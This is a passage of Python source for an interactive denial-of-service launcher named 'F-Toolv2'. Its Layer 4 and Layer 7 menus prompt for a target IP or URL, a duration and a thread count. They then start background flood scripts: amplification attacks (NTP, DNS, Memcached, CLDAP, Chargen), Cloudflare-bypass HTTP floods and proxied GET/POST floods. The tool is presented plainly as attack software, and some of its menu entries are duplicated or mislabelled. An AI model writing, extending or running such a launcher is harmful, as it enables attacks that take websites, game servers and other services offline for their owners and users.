				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['06', '6']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py CPS {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("CPS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['07', '7']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py ICMP {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("ICMP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['08', '8']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py CONNECTION {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("CONNECTION"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['09', '9']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py TS3 {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("TS3"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['10']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py FIVEM {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("FIVEM"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['11']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py MEM {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("MEM"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['12']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py NTP {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("NTP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['13']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py MCBOT {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("MCBOT"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['14']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py MINECRAFT {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("MINECRAFT"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['15']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py MCPE {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("MCPE"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['16']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py DNS {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("DNS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['17']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py CHAR {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("CHAR"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['18']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py CLDAP {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("CLDAP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['19']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py ARD {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("ARD"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['20']:
				try:
					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 huha/start.py RPD {ip}:{port} {floodtime} {thread}'], shell=True)
					AttackSentL4(str(ip), int(port), int(floodtime), int(thread), str("RPD"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['ref', 'REF']:
				self.l4()
			elif option in ['home', 'HOME']:
				F_Tool.home()
			elif option in ['clear', 'CLEAR']:
				os.system('clear');self.l4()
			elif option in ['help', 'HELP', '?']:
				print(self.help)
			elif option in ['dev', 'DEV']:
				print(self.dev)
			elif option in ['exit', 'EXIT']:
				subprocess.run(['pkill -f F-Tool.py'], shell=True)
			elif option in ['stop', 'STOP']:
				subprocess.run(['pkill screen'], shell=True)
				print(f"{Color.LG} [!] Attack Stopped!")
			elif option in ['00', '0']:
				os.system('clear');self.bbos()
			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
				os.system('clear');Tool.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l7(self):
		print(f"""

\033[38;5;166m ██▓    ▄▄▄     ▓██   ██▓▓█████  ██▀███     ███████ 
\033[38;5;167m▓██▒   ▒████▄    ▒██  ██▒▓█   ▀ ▓██ ▒ ██▒        ██ 
\033[38;5;168m▒██░   ▒██  ▀█▄   ▒██ ██░▒███   ▓██ ░▄█ ▒       ██  
\033[38;5;169m▒██░   ░██▄▄▄▄██  ░ ▐██▓░▒▓█  ▄ ▒██▀▀█▄       ██   
\033[38;5;170m░██████▒▓█   ▓██▒ ░ ██▒▓░░▒████▒░██▓ ▒██▒    ██   
\033[38;5;171m░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
\033[38;5;172m░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░  ░ ░  ░  ░▒ ░ ▒░
\033[38;5;173m  ░ ░    ░   ▒   ▒ ▒ ░░     ░     ░░   ░ 
\033[38;5;174m    ░  ░     ░  ░░ ░        ░  ░   ░     
\033[38;5;175m                 ░ ░                     

""")
		print("\033[38;5;178m""[""\033[38;5;40m""01""\033[38;5;178m""]""\033[38;5;226m"" SOCKET-MIX | Slow HTTP/1.1 Socket flood (JS)")
		print("\033[38;5;178m""[""\033[38;5;41m""02""\033[38;5;178m""]""\033[38;5;226m"" HTTP1 | TLS HTTP/1.1 GET flood (JS)")
		print("\033[38;5;178m""[""\033[38;5;42m""03""\033[38;5;178m""]""\033[38;5;226m"" HTTP2 | TLS HTTP/2 GET flood (JS)")
		print("\033[38;5;178m""[""\033[38;5;45m""06""\033[38;5;178m""]""\033[38;5;226m"" CF-KILL | Cloudflare Killer (JS)")
		print("\033[38;5;178m""[""\033[38;5;46m""07""\033[38;5;178m""]""\033[38;5;226m"" CRINGEv2 | Powerful Method Target Maybe die from Cringe (JS)")
		print("\033[38;5;178m""[""\033[38;5;47m""08""\033[38;5;178m""]""\033[38;5;226m"" CONNECTION : Open connection alive with proxy")
		print("\033[38;5;178m""[""\033[38;5;48m""09""\033[38;5;178m""]""\033[38;5;226m"" TS3 : Send Teamspeak 3 Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;49m""10""\033[38;5;178m""]""\033[38;5;226m"" FIVEM : Send Fivem Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;50m""11""\033[38;5;178m""]""\033[38;5;226m"" MEM : Memcached Amplification")
		print("\033[38;5;178m""[""\033[38;5;51m""12""\033[38;5;178m""]""\033[38;5;226m"" NTP : NTP Amplification")
		print("\033[38;5;178m""[""\033[38;5;82m""13""\033[38;5;178m""]""\033[38;5;226m"" MCBOT : Minecraft Bot Attack")
		print("\033[38;5;178m""[""\033[38;5;83m""14""\033[38;5;178m""]""\033[38;5;226m"" MINECRAFT : Minecraft Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;84m""15""\033[38;5;178m""]""\033[38;5;226m"" MCPE : Minecraft PE Status Ping Protocol")
		print("\033[38;5;178m""[""\033[38;5;85m""16""\033[38;5;178m""]""\033[38;5;226m"" DNS : DNS Amplification")
		print("\033[38;5;178m""[""\033[38;5;86m""17""\033[38;5;178m""]""\033[38;5;226m"" CHAR : Chargen Amplification")
		print("\033[38;5;178m""[""\033[38;5;87m""18""\033[38;5;178m""]""\033[38;5;226m"" CLDAP : Cldap Amplification")
		print("\033[38;5;178m""[""\033[38;5;118m""19""\033[38;5;178m""]""\033[38;5;226m"" ARD : Apple Remote Desktop Amplification")
		print("\033[38;5;178m""[""\033[38;5;119m""20""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;120m""21""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;121m""22""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;122m""23""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;123m""24""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;154m""25""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;155m""26""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;156m""27""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;157m""28""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;158m""29""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;159m""30""\033[38;5;178m""]""\033[38;5;226m"" RDP : Remote Desktop Protocol Amplification")
		print("\033[38;5;178m""[""\033[38;5;226m""00""\033[38;5;178m""]""\033[38;5;226m"" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put http:// or https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket1 {url} utils/http.txt {floodtime} 200'], shell=True);subprocess.run([f'screen -dm node utils/L7/socket2 {url} {floodtime}'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("SOCKET-MIX"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '2']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("TLS-HTTP1"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['03', '3']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http2 {url} {floodtime}'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("TLS-HTTP2"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['04', '4']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/cfkill {url} {floodtime} 1'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("CF-KILL"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['05', '5']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/cringeV2 {url} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("CRINGEv2"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['06', '6']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py GET {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("GET"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['07', '7']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py POST {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("POST"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['08', '8']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py OVH {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("OVH"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['09', '9']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py RHEX {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("RHEX"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['10']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py STOMP {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("STOMP"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['11']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py STRESS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("STRESS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['12']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py DYN {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("DYN"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['13']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py DOWNLOADER {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("DOWNLOADER"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['14']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py SLOW {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("SLOW"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['15']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py HEAD {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("HEAD"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['16']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py NULL {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("NULL"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['17']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py COOKIE {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("COOKIE"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['18']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					if url in '':
						print(f"{Color.LR}ERROR: {Color.RESET}Try again")
						print(f"{Color.LR}ERROR: {Color.RESET}Xin vui lòng thử lại")
					else:
						if urlparse(url).scheme in '':
							print(f"{Color.LR}ERROR: {Color.RESET}Please Put https://")
						else:
							floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
							socks = int(input(f"{Color.LG} [>] socks: "+Color.RESET))
							threads = int(input(f"{Color.LG} [>] threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} [>] rpc: "+Color.RESET))
							F_Tool.getproxies();subprocess.run([f'screen -dm python3 huha/start.py PPS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
							AttackSentL7(str(urlparse(url).netloc), int(floodtime), str("PPS"))
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['19']:
				try:
